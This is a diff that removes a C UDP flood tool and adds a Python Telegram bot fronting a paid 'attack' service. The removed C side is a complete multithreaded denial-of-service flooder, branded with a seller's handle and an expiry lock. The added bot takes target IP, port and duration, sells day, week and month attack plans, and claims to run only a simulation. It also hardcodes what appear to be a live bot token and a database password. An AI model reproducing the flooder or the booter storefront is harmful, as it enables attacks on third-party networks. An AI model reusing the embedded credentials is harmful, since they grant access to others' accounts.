@@ -1,220 +1,199 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <arpa/inet.h>
-#include <pthread.h>
-#include <time.h>
-#include <wchar.h>
-#include <locale.h>
-#include <fcntl.h>
-#include <termios.h>
-#include <signal.h>
-#include <errno.h>
+import os
+import telebot
+import logging
+import time
+from pymongo import MongoClient
+from datetime import datetime, timedelta
+import certifi
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
-#define THREADS 100   // Threads (adjust for best performance)
-#define BUFFER_SIZE 9999999     // Max UDP packet size for efficiency
+# --- CONFIG ---
+TOKEN = '8205368169:AAHcff32byoFa2PCtz1p8K29kaNVTvEOjic'
+MONGO_URI = 'mongodb+srv://ihatemosquitos9:JvOK4gNs0SH5SVw9@cluster0.1pd5kt5.mongodb.net/?appName=Cluster0'
+CHANNEL_ID = -1002979156858  # replace if needed
 
-#define EXPIRY_YEAR 2027
-#define EXPIRY_MONTH 12
-#define EXPIRY_DAY 15
-#define EXPIRY_HOUR 12
-#define EXPIRY_MINUTE 0
-#define EXPIRY_SECOND 0
+# --- Setup ---
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+db = client['NOOB']
+users_collection = db.users
+bot = telebot.TeleBot(TOKEN)
 
-// ANSI color codes for crazy effects
-static const char *colors[] = {
-    "\033[1;31m", "\033[1;32m", "\033[1;33m", 
-    "\033[1;34m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
-};
+REQUEST_INTERVAL = 1
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-// Characters for the crazy animation
-static const wchar_t anim_chars[] = {L'█', L'▓', L'▒', L'░', L'*', L'!', L'#', L'$', L'%', L'&', L'@', L'?'};
+# --------------------------
+# APPROVAL CHECK REMOVED
+# --------------------------
+def check_user_approval(user_id):
+    # Always allow (approval removed)
+    return True
 
-// Structure to hold attack data
-typedef struct attack_data {
-    char target_ip[INET_ADDRSTRLEN];
-    int target_port;
-    int attack_duration;
-    volatile int *stop_flag;  // Declare the pointer as volatile
-} AttackData;
+def send_not_approved_message(chat_id):
+    bot.send_message(chat_id, "*🚫 YOU ARE NOT APPROVED 🚫\n\nContact an Admin for access.*", parse_mode='Markdown')
 
-// Function to set socket options for better performance
-void set_socket_options(int sock) {
-    int opt = 1;
-    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
-    int buffer_size = BUFFER_SIZE;  // Buffer size for sending
-    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
-}
+@bot.message_handler(commands=['approve', 'disapprove'])
+def approve_or_disapprove_user(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    is_admin = is_user_admin(user_id, CHANNEL_ID)
+    cmd_parts = message.text.split()
+    if not is_admin:
+        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
+        return
 
-void *attack(void *arg) {
-    AttackData *data = (AttackData *)arg;
-    int sock;
-    struct sockaddr_in server_addr;
-    time_t endtime;
+    if len(cmd_parts) < 2:
+        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
+        return
 
-    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
-        perror("Failed to create socket 😢");
-        pthread_exit(NULL);
-    }
-    set_socket_options(sock);
+    action = cmd_parts[0]
+    target_user_id = int(cmd_parts[1])
+    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
+    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
+    if action == '/approve':
+        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*✅ User {target_user_id} approved for plan {plan} *"
+    else:
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} disapproved*"
 
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(data->target_port);
-    if (inet_pton(AF_INET, data->target_ip, &server_addr.sin_addr) <= 0) {
-        perror("Invalid IP address or not supported 🚫");
-        close(sock);
-        pthread_exit(NULL);
-    }
+    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+    try:
+        bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
+    except Exception:
+        pass
 
-    endtime = time(NULL) + data->attack_duration;
-    char payload[1000];
-    for (int i = 0; i < sizeof(payload) - 1; i++) {
-        payload[i] = 'A' + (rand() % 26);
-    }
-    payload[sizeof(payload) - 1] = '\0';
+@bot.message_handler(commands=['Attack'])
+def attack_command(message):
+    # Approval removed — anyone can reach here
+    try:
+        bot.send_message(
+            message.chat.id,
+            "*Please provide the details for the attack simulation in the following format:\n\n`<IP> <Port> <Duration>`*",
+            parse_mode='Markdown'
+        )
+        bot.register_next_step_handler(message, process_attack_command)
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
 
-    while (time(NULL) < endtime && !(*data->stop_flag)) {
-        ssize_t sent = sendto(sock, payload, sizeof(payload), 0,
-                              (const struct sockaddr *)&server_addr, sizeof(server_addr));
-        if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
-            usleep(100);  // Small sleep for resource efficiency
-        } else if (sent < 0) {
-            perror("Failed to send packet 🚀");
-            break;
-        }
-    }
-    close(sock);
-    pthread_exit(NULL);
-}
+def process_attack_command(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.send_message(message.chat.id, "*Invalid Format\n\nUse `<IP> <Port> <Duration>`*", parse_mode='Markdown')
+            return
 
-void *crazy_animation(void *arg) {
-    int attack_duration = *(int *)arg;
-    setlocale(LC_CTYPE, "");
-    time_t endtime = time(NULL) + attack_duration;
+        target_ip, target_port_str, duration_str = args[0], args[1], args[2]
 
-    printf("*****************************************\n");
-    printf("🔥 TELEGRAM CHANNEL: @LSR_RAJPUT 🔥\n");
-    printf("💰 DM TO BUY : @LSR_RAJPUT 💰\n");
-    printf("🛑 STOP ATTACK / NEW ATTACK PRESS: Q 🛑\n");
-    printf("⏰ Expiry Date (IST): %02d-%02d-%04d %02d:%02d:%02d\n",
-           EXPIRY_DAY, EXPIRY_MONTH, EXPIRY_YEAR, EXPIRY_HOUR, EXPIRY_MINUTE, EXPIRY_SECOND);
-    printf("*****************************************\n");
+        # basic validation
+        try:
+            target_port = int(target_port_str)
+            duration = int(duration_str)
+        except ValueError:
+            bot.send_message(message.chat.id, "*Port and Duration must be numbers.*", parse_mode='Markdown')
+            return
 
-    while (time(NULL) < endtime) {
-        int time_left = (int)(endtime - time(NULL));
-        int minutes = time_left / 60;
-        int seconds = time_left % 60;
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
+            return
 
-        printf("\r%s█▒▓░   Time Left: %02d:%02d %s\033[0m",
-               colors[rand() % 7], minutes, seconds, colors[rand() % 7]);
-        fflush(stdout);
-        usleep(90000);  // Sleep for smoother animation
-    }
-    printf("\r%s🎉 Attack Completed! 🎉\033[0m\n", colors[0]);
-    return NULL;
-}
+        if duration > 420:
+            bot.send_message(message.chat.id, f"*Maximum duration allowed is 420 seconds.*", parse_mode='Markdown')
+            return
 
-void set_nonblocking_mode() {
-    struct termios term;
-    tcgetattr(STDIN_FILENO, &term);
-    term.c_lflag &= ~(ICANON | ECHO);
-    tcsetattr(STDIN_FILENO, TCSANOW, &term);
-}
+        username = message.from_user.username or message.from_user.first_name
 
-void *check_for_exit(void *arg) {
-    volatile int *stop_flag = (volatile int *)arg;
-    set_nonblocking_mode();
-    while (1) {
-        char c;
-        if (read(STDIN_FILENO, &c, 1) == 1 && c == 'q') {
-            *stop_flag = 1;
-            kill(getpid(), SIGTERM);
-            break;
-        }
-        usleep(100000); // Reduce CPU usage by adding a small delay
-    }
-    return NULL;
-}
+        # SAFE: Do NOT execute any external attack binary.
+        start_msg = bot.send_message(
+            message.chat.id,
+            f"*🟢 Simulation Acknowledged (NO ACTION EXECUTED)*\n\n"
+            f"📌 **Target (sim):** {target_ip}:{target_port}\n"
+            f"⏰ **Duration (sim):** {duration} seconds\n"
+            f"👤 **Requested by:** @{username}\n\n"
+            f"_This is a simulation only — no external command was run._",
+            parse_mode='Markdown'
+        )
 
-// Convert UTC to IST (Indian Standard Time)
-void convert_utc_to_ist(struct tm *time_info) {
-    time_info->tm_hour += 5;
-    time_info->tm_min += 30;
+        # log simulation in DB
+        users_collection.insert_one({
+            "user_id": message.from_user.id,
+            "username": username,
+            "target_ip": target_ip,
+            "target_port": target_port,
+            "duration": duration,
+            "timestamp": datetime.utcnow(),
+            "type": "simulation"
+        })
 
-    if (time_info->tm_min >= 60) {
-        time_info->tm_min -= 60;
-        time_info->tm_hour++;
-    }
-    if (time_info->tm_hour >= 24) {
-        time_info->tm_hour -= 24;
-        time_info->tm_mday++;
-    }
-}
+        # delete message after a short time for cleanliness
+        time.sleep(15)
+        try:
+            bot.delete_message(message.chat.id, start_msg.message_id)
+        except Exception:
+            pass
 
-int main(int argc, char *argv[]) {
-    if (argc != 4) {
-        printf("🔧 Usage: %s <target_ip> <target_port> <attack_duration> 🔧\n", argv[0]);
-        return 1;
-    }
+    except Exception as e:
+        logging.error(f"Error in processing attack command: {e}")
 
-    char *target_ip = argv[1];
-    int target_port = atoi(argv[2]);
-    int attack_duration = atoi(argv[3]);
+def is_user_admin(user_id, chat_id):
+    try:
+        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
+    except Exception:
+        return False
 
-    struct tm expiry_time = {0};
-    expiry_time.tm_year = EXPIRY_YEAR - 1900;
-    expiry_time.tm_mon = EXPIRY_MONTH - 1;
-    expiry_time.tm_mday = EXPIRY_DAY;
-    expiry_time.tm_hour = EXPIRY_HOUR;
-    expiry_time.tm_min = EXPIRY_MINUTE;
-    expiry_time.tm_sec = EXPIRY_SECOND;
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
 
-    convert_utc_to_ist(&expiry_time);
+    btn1 = KeyboardButton("Attack 🚀")
+    btn2 = KeyboardButton("My Info ℹ️")
+    btn3 = KeyboardButton("Buy Access! 💰")
+    btn4 = KeyboardButton("Rules 🔰")
 
-    time_t current_time_utc = time(NULL);  // Changed to standard time function
-    time_t expiry_time_utc = mktime(&expiry_time);
+    markup.add(btn1, btn2, btn3, btn4)
 
-    if (difftime(expiry_time_utc, current_time_utc) <= 0) {
-        printf("🚫 This tool has expired. Please contact @LSR_RAJPUT for renewal. 🚫\n");
-        return 1;
-    }
+    bot.send_message(message.chat.id, "*🔆 WELCOME (SIMULATION MODE) 🔆*", reply_markup=markup, parse_mode='Markdown')
 
-    volatile int stop_flag = 0;
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    # approval removed — all users allowed
+    if message.text == "Buy Access! 💰":
+        bot.reply_to(message, "*SIMULATION PRICES\n\n[Premium]\n> DAY - 200 INR\n> WEEK - 700 INR\n\n[Platinum]\n> MONTH - 1600 INR\n\nDM TO BUY *", parse_mode='Markdown')
+    elif message.text == "Attack 🚀":
+        attack_command(message)
+    elif message.text == "Rules 🔰":
+        bot.send_message(message.chat.id, "*RULES (SIMULATION)\n1. This bot runs in simulation-only mode.\n2. No real network actions are performed.*", parse_mode='Markdown')
+    elif message.text == "My Info ℹ️":
+        user_id = message.from_user.id
+        user_data = users_collection.find_one({"user_id": user_id})
+        if user_data:
+            username = message.from_user.username or message.from_user.first_name
+            plan = user_data.get('plan', 'N/A')
+            valid_until = user_data.get('valid_until', 'N/A')
+            response = (f"*USERNAME: @{username}\n"
+                        f"USER ID: {user_id}\n"
+                        f"PLAN: {plan} days\n"
+                        f"METHOD: simulation*")
+        else:
+            response = "*No account information found.*"
+        bot.reply_to(message, response, parse_mode='Markdown')
+    else:
+        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
-    // Using a fixed number of threads for simplicity and performance
-    int threads = THREADS;
-    pthread_t attack_threads[threads];
-    AttackData data[threads];
-
-    for (int i = 0; i < threads; i++) {
-        strncpy(data[i].target_ip, target_ip, INET_ADDRSTRLEN - 1);
-        data[i].target_ip[INET_ADDRSTRLEN - 1] = '\0';  // Ensure null-termination
-        data[i].target_port = target_port;
-        data[i].attack_duration = attack_duration;
-        data[i].stop_flag = &stop_flag;
-
-        if (pthread_create(&attack_threads[i], NULL, attack, (void *)&data[i]) != 0) {
-            perror("Thread creation failed 😓");
-            exit(1);
-        }
-    }
-
-    pthread_t animation_thread;
-    pthread_create(&animation_thread, NULL, crazy_animation, (void *)&attack_duration);
-
-    pthread_t exit_thread;
-    pthread_create(&exit_thread, NULL, check_for_exit, (void *)&stop_flag);
-
-    for (int i = 0; i < threads; i++) {
-        pthread_join(attack_threads[i], NULL);
-    }
-
-    pthread_join(animation_thread, NULL);
-    pthread_join(exit_thread, NULL);
-
-    printf("\n🎯 Attack completed. 🎯\n");
-    return 0;
-}
+if __name__ == "__main__":
+    logging.info("Starting Telegram bot (SIMULATION MODE)...")
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"An error occurred while polling: {e}")
+        time.sleep(REQUEST_INTERVAL)
